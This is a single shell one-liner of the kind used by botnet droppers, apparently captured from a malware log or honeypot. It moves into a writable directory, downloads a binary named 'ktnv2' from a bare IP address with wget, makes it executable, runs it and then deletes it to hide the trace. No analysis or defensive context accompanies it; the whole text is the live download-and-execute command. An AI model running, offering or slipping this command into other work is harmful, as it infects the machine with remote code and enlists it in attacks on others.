cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://173.242.118.143/ktnv2; chmod +x ktnv2; ./ktnv2; rm -rf ktnv2
